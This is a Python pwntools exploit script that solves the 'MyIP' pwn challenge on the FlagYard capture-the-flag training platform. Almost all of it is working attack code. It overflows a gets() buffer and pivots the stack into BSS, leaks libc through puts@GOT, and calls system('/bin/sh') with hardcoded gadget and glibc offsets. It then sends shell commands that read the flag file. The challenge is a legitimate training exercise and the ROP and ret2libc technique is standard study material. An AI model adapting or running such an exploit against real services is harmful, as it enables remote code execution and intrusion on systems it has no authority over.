#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MyIP  -  FlagYard Pwn solver

MyIP (FlagYard Training Labs, Pwn / SAFCSP) - an "ICMP packet handler" that
reads a 8-byte header, dispatches on the type field, and for type 8 hands the
rest of the packet to gets().  No canary (the "stack guard" stores a constant
and compares it to itself) and main is one-shot, so the whole ROP chain has to
be staged through BSS with two extra gets() calls:

    gets overflow -> gets(0x405300) -> leave;ret
    stage 2: puts(puts@GOT) -> libc leak ; gets(0x405900) -> leave;ret
    stage 3: pop rdi ; libc+"/bin/sh" ; ret ; system            -> SHELL -> flag

glibc 2.39, offsets hardcoded.  Needs pwntools only.

Target is given as host:port (default tcp.flagyard.com:22948).
"""
from __future__ import annotations

from pwn import *
import re
import sys
import time
from pathlib import Path

# ---------------------------------------------------------------------------
# coloured output (same design as the other FlagYard solvers)
# ---------------------------------------------------------------------------
class C:
    RESET = "\033[0m"; BOLD = "\033[1m"; DIM = "\033[2m"
    RED = "\033[31m"; GREEN = "\033[32m"; YELLOW = "\033[33m"
    BLUE = "\033[34m"; MAGENTA = "\033[35m"; CYAN = "\033[36m"; GRAY = "\033[90m"
    WHITE = "\033[97m"

def enable_vt():
    if sys.platform == "win32":
        try:
            import ctypes
            k32 = ctypes.windll.kernel32
            mode = ctypes.c_uint()
            h = k32.GetStdHandle(-11)
            k32.GetConsoleMode(h, ctypes.byref(mode))
            k32.SetConsoleMode(h, mode.value | 0x0004)
        except Exception:
            pass
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

def bar(frac):
    w = 20
    f = max(0.0, min(1.0, frac))
    full = int(round(f * w))
    return "[%s%s] %5.1f%%" % ("\u2588" * full, "\u2591" * (w - full), f * 100.0)

def step(msg, icon="\u25b6", color=C.CYAN):
    print("  %s%s %s%s%s" % (C.BOLD + color + icon + " ",
                             C.DIM, C.BOLD, msg, C.RESET), flush=True)

def ok(msg):
    step(msg, icon="\u2713", color=C.GREEN)

def tick(frac, msg):
    """single moving progress line (updates in place via carriage return)."""
    line = ("%s%s %s %s%s%s" %
            (C.BOLD + C.YELLOW + "\u25b6 ",
             C.CYAN + bar(frac) + C.RESET,
             C.DIM, C.BOLD, msg, C.RESET))
    sys.stdout.write("\r  " + line + "   ")
    sys.stdout.flush()

def fail(msg):
    print("  %s\u2717 %s%s%s" % (C.RED, C.BOLD, msg, C.RESET), flush=True)

def banner():
    print(C.MAGENTA + C.BOLD)
    print("  " + "\u2554" + "\u2550" * 58 + "\u2557")
    for t in ("M Y I P   S O L V E R",
              "gets overflow -> BSS staging -> puts@GOT -> system(\"/bin/sh\")"):
        l = (58 - len(t)) // 2
        print("  \u2551" + " " * l + t + " " * (58 - len(t) - l) + "\u2551")
    print("  \u255a" + "\u2550" * 58 + "\u255d")
    print(C.RESET)

# ---------------------------------------------------------------------------
# result panel (fixed-width frame) + author credits
# ---------------------------------------------------------------------------
W = 58
_TG = "\033[1;38;2;0;136;204m"
_OSC_END = "\x1b]8;;\x1b\\"

def _osc(url, color):
    return "\x1b]8;;%s\x1b\\%s" % (url, color)

def _row(segs):
    out = "  \u2551"
    for t, pre, post in segs:
        if pre:
            out += pre + t + (post or "") + C.RESET
        else:
            out += t
    out += " " * (W - sum(len(t) for t, _, _ in segs)) + "\u2551"
    print(out)

def _credits():
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   made with ", C.GREEN, ""), ("\u2764", "\033[1;31m", ""),
          ("  by  ", C.GREEN, ""), ("Fares Badaj", C.BOLD + C.WHITE, "")])
    _row([("   Red Team Operator | Penetration Tester Specialist", C.DIM + C.CYAN, "")])
    print("  " + "\u2560" + "\u2550" * W + "\u2563")
    _row([("   Telegram  \u203a  ", "", ""),
          ("@ptok3", _osc("https://t.me/ptok3", _TG), _OSC_END),
          ("      t.me/ptok3", C.DIM + C.GRAY, "")])
    _row([("   GitHub    \u203a  ", "", ""),
          ("github.com/FaresBadaj", _osc("https://github.com/FaresBadaj", "\033[1;36m"), _OSC_END)])
    _row([("   LinkedIn  \u203a  ", "", ""),
          ("linkedin.com/in/FaresBadaj", _osc("https://www.linkedin.com/in/FaresBadaj", "\033[1;34m"), _OSC_END)])
    _row([("   Credly    \u203a  ", "", ""),
          ("credly.com/users/faresbadaj", _osc("https://www.credly.com/users/faresbadaj", "\033[1;33m"), _OSC_END)])
    print("  \u255a" + "\u2550" * W + "\u255d")

def big_flag(flag, chrono):
    print()
    head = "\u2605  FLAG RECOVERED  \u2605"
    print("  " + "\u2554" + "\u2550" * W + "\u2557")
    _row([("", "", "")])
    _row([(" " * ((W - len(head)) // 2), "", ""), (head, C.BOLD + C.YELLOW, "")])
    _row([("", "", "")])
    _row([(" " * 6, "", ""), (flag, C.BOLD + C.GREEN, "")])
    _row([(" " * 10, "", ""), ("elapsed %.1f s" % chrono, C.DIM + C.CYAN, "")])
    _row([("", "", "")])
    _credits()
    print()

# ---------------------------------------------------------------------------
# helpers
# ---------------------------------------------------------------------------
def ask_target(argv):
    if len(argv) > 1 and (":" in argv[1] or argv[1].startswith("http")):
        return argv[1].strip()
    raw = input("  Enter the MyIP challenge target (host:port): ").strip()
    return raw or "tcp.flagyard.com:22948"

def parse_target(raw):
    raw = raw.replace("tcp://", "").replace("http://", "").rstrip("/")
    if ":" in raw:
        host, port_s = raw.rsplit(":", 1)
    else:
        host, port_s = raw, "22948"
    return host, int(port_s)

def read_flag(raw):
    if isinstance(raw, bytes):
        raw = raw.decode("utf-8", "replace")
    m = re.search(r"(FlagY\{[^}]+\})", raw)
    return m.group(1) if m else None

# ---------------------------------------------------------------------------
# offsets (this instance's binary / glibc 2.39)
# ---------------------------------------------------------------------------
GOT_PUTS   = 0x405000    # puts@GOT                      -> libc leak
PLT_PUTS   = 0x4010e4    # puts@PLT
PLT_GETS   = 0x401164    # gets@PLT  (the vulnerability)
G_POP_RDI  = 0x401513    # pop rdi ; ret
G_POP_RBP  = 0x401516    # pop rbp ; ret
G_LEAVE    = 0x401602    # leave ; ret
G_RET      = 0x401494    # ret
LIB_PUTS   = 0x87be0     # puts
LIB_SYSTEM = 0x58750     # system
LIB_BINSH  = 0x1cb42f    # "/bin/sh" string

# BSS ends at 0x4054d0 (page runs to 0x406000).  The final libc call needs a
# big stack, so the second ROP region sits high -> ~0x900 bytes available.
REGION_A = 0x405300
REGION_B = 0x405900

TYPE8 = bytes([8, 0, 0, 0, 0, 0, 0, 0])   # type=8, code=0, id=0, seq=0

def has_nl(*vals):
    """gets() stops on 0x0a, so no address may contain that byte."""
    return any(0x0A in p64(v)[:3] for v in vals)

def drain(io, seconds):
    out = b""
    t0 = time.time()
    while time.time() - t0 < seconds:
        try:
            d = io.recv(4096, timeout=max(0.3, seconds - (time.time() - t0)))
        except Exception:
            break
        if not d:
            break
        out += d
    return out

def find_puts(data):
    """scan the 6 raw bytes puts() gave us for a page-aligned libc address"""
    for i in range(len(data) - 5):
        if data[i + 5] != 0x7F:
            continue
        v = u64(data[i:i + 6].ljust(8, b"\x00"))
        b = v - LIB_PUTS
        if 0x7F0000000000 <= b <= 0x7FFFFFFFFFFF and b % 0x1000 == 0:
            return b
    return None

# ---------------------------------------------------------------------------
# the three stages
# ---------------------------------------------------------------------------
def stage1():
    """overflow gets()@rbp-0x40, then read stage 2 into BSS and pivot there"""
    return (b"A" * 0x40        # 0x00 padding, rbp-0x40 .. rbp-0x01
            + p64(REGION_A)   # 0x40 saved rbp
            + p64(G_RET)      # 0x48 saved RIP  -> ret            (stack align)
            + p64(G_POP_RDI)  # 0x50
            + p64(REGION_A)   # 0x58 rdi = REGION_A
            + p64(PLT_GETS)   # 0x60 gets(REGION_A) -> reads stage 2
            + p64(G_POP_RBP)  # 0x68
            + p64(REGION_A)   # 0x70 rbp = REGION_A
            + p64(G_LEAVE))   # 0x78 leave ; ret    -> pivot to REGION_A+8

def stage2():
    """leak libc through puts@GOT, then read stage 3 into BSS and pivot there"""
    s = b""
    s += p64(0x4141414141414141)     # REGION_A+0x00 : junk rbp
    s += p64(G_RET)                  # REGION_A+0x08
    s += p64(G_POP_RDI)              # REGION_A+0x10
    s += p64(GOT_PUTS)               # REGION_A+0x18 : rdi = &puts
    s += p64(PLT_PUTS)               # REGION_A+0x20 : puts(puts@GOT) = leak
    s += p64(G_POP_RDI)              # REGION_A+0x28
    s += p64(REGION_B)               # REGION_A+0x30 : rdi = REGION_B
    s += p64(PLT_GETS)               # REGION_A+0x38 : gets(REGION_B)
    s += p64(G_POP_RBP)              # REGION_A+0x40
    s += p64(REGION_B)               # REGION_A+0x48
    s += p64(G_LEAVE)                # REGION_A+0x50 : pivot
    return s

def stage3(lbase):
    """system(\"/bin/sh\") straight out of high BSS"""
    return (p64(0x4141414141414141)   # REGION_B+0x00 : junk rbp
            + p64(G_POP_RDI)
            + p64(lbase + LIB_BINSH)
            + p64(G_RET)             # keeps rsp == 8 (mod 16) at the call
            + p64(lbase + LIB_SYSTEM))

# ---------------------------------------------------------------------------
# exploit
# ---------------------------------------------------------------------------
def exploit(host, port, tries=12):
    for n in range(tries):
        io = remote(host, port, timeout=12)
        try:
            # 1) reach the vulnerable gets(): an 8-byte type-8 ICMP header
            io.recvuntil(b"Send your ICMP packet:")
            io.send(TYPE8)
            io.recvuntil(b"Processing ICMP payload...")

            # 2) overflow -> stage 2 into BSS -> libc leak + stage 3 read
            io.sendline(stage1())
            io.sendline(stage2())
            lbase = find_puts(drain(io, 6))
            if lbase is None:
                fail("attempt %d: libc leak failed" % (n + 1))
                io.close()
                continue
            ok("libc base = %s   system = %s" %
               (C.YELLOW + hex(lbase) + C.RESET, C.YELLOW + hex(lbase + LIB_SYSTEM) + C.RESET))
            tick(0.6, "staging system(\"/bin/sh\") chain in high BSS")

            if has_nl(lbase + LIB_BINSH, lbase + LIB_SYSTEM):
                fail("leaked addresses contain 0x0a - reroll")
                io.close()
                continue

            # 3) final chain -> shell
            io.sendline(stage3(lbase))
            time.sleep(0.7)
            io.sendline(b"echo PWNED")
            io.sendline(b"cat /app/flag 2>/dev/null || cat flag 2>/dev/null || ls -la")
            data = drain(io, 6)
            flag = read_flag(data)
            if flag:
                return flag
            if b"PWNED" in data or b"uid=" in data:
                return "SHELL OK but flag not seen; raw=%r" % data[:300]
            fail("attempt %d: no shell; raw=%r" % (n + 1, data[:200]))
            io.close()
        except Exception as e:
            fail("attempt %d: %s" % (n + 1, e))
            try:
                io.close()
            except Exception:
                pass
    return "exhausted every attempt"


def main() -> None:
    t0 = time.time()
    enable_vt()
    banner()
    context.log_level = "error"

    try:
        raw = ask_target(sys.argv)
    except Exception:
        fail("no challenge target given")
        return
    host, port = parse_target(raw)
    step("target host %s:%d" % (host, port))

    step("connecting to the service")
    flag = exploit(host, port)
    if flag and flag.startswith("FlagY"):
        tick(0.9, "shell spawned and flag read")
        print()
        ok("FLAG = %s" % flag)

        big_flag(flag, time.time() - t0)
        outp = Path(__file__).resolve().parent / "flag_from_myip.txt"
        outp.write_text(flag + "\n", encoding="utf-8")
        print("  %s[+] saved to %s%s" % (C.GREEN, outp, C.RESET))
    else:
        fail(str(flag))


if __name__ == "__main__":
    main()
